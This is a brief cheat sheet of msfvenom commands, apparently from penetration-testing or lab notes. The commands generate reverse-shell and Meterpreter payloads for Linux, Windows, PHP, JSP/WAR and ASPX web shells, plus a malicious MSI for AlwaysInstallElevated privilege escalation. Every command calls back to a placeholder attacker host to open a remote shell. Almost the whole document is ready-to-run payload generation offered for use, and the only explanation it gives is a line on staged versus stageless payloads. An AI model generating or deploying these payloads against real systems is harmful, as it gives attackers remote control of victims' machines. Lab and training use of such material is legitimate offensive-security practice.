# MSFVenom Payloads

## Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=KALI LPORT=4444 -f elf -o meterpreter.elf
```

## Windows

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI LPORT=4444 -f exe -o meterpreter.exe
```

## Web

```bash
msfvenom -p php/reverse_php LHOST=KALI LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f aspx -o shell.aspx
```

## MSI (AlwaysInstallElevated)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi
```

## Staged vs Stageless

```
staged (/ slash):     linux/x64/meterpreter/reverse_tcp   (smaller, needs multi/handler)
stageless (_ underscore): linux/x64/meterpreter_reverse_tcp   (bigger, works with nc)
```
